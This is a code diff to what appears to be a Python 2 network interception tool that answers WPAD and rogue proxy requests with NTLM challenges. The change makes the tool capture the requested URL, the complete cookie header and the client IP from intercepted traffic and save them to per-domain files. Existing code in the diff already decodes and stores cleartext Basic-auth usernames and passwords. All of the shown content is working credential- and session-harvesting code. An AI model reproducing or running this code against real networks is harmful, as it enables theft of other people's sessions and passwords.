@@ -741,9 +741,11 @@ def GrabCookie(data,host):
           CookieStr = "[+]HTTP Cookie Header sent from: %s The Cookie is: \n%s"%(host,Cookie.group(0))
           logging.warning(CookieStr)
           print CookieStr
+          return Cookie.group(0)
     else:
           NoCookies = "[+]No cookies were sent with this request"
           logging.warning(NoCookies)
+          return NoCookies
 
 def WpadCustom(data,client):
     b = re.search('(/wpad.dat)', data)
@@ -824,9 +826,10 @@ from HTTPProxy import *
 def GrabHost(data,host):
     Host = re.findall('(?<=GET )[^HTTP]*', data)
     if Host:
-          HostStr = "[+]HTTP Proxy Requested sent from: %s The URL was: %s"%(host,''.join(Host))
+          HostStr = "[+]HTTP Proxy sent from: %s The requested URL was: %s"%(host,''.join(Host))
           logging.warning(HostStr)
           print HostStr
+          return ''.join(Host)
     else:
           NoHost = "[+]No host url sent with this request"
           logging.warning(NoHost)
@@ -844,8 +847,12 @@ def ProxyPacketSequence(data,client):
     if a:
        packetNtlm = b64decode(''.join(a))[8:9]
        if packetNtlm == "\x01":
-          GrabHost(data,client)
-          GrabCookie(data,client)
+          Host = GrabHost(data,client)
+          Cookie = GrabCookie(data,client)
+          DomainName = re.search('^(.*:)//([a-z\-.]+)(:[0-9]+)?(.*)$', Host)
+          Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s"%(Host, Cookie, client)
+          OutFile = "HTTPCookies/HTTP-Cookie-"+DomainName.group(2)+".txt"
+          WriteData(OutFile,Message)
           r = NTLM_Challenge(ServerChallenge=Challenge)
           r.calculate()
           t = IIS_407_NTLM_Challenge_Ans()
@@ -859,8 +866,12 @@ def ProxyPacketSequence(data,client):
           buffer1.calculate()
           return str(buffer1)
     if b:
-       GrabHost(data,client)
-       GrabCookie(data,client)
+       Host = GrabHost(data,client)
+       Cookie = GrabCookie(data,client)
+       DomainName = re.search('^(.*:)//([a-z\-.]+)(:[0-9]+)?(.*)$', Host)
+       Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s"%(Host, Cookie, client)
+       OutFile = "HTTPCookies/HTTP-Cookie-"+DomainName.group(2)+".txt"
+       WriteData(OutFile,Message)
        outfile = "HTTP-Clear-Text-Password-"+client+".txt"
        WriteData(outfile,b64decode(''.join(b)))
        print "[+]HTTP-User & Password:", b64decode(''.join(b))
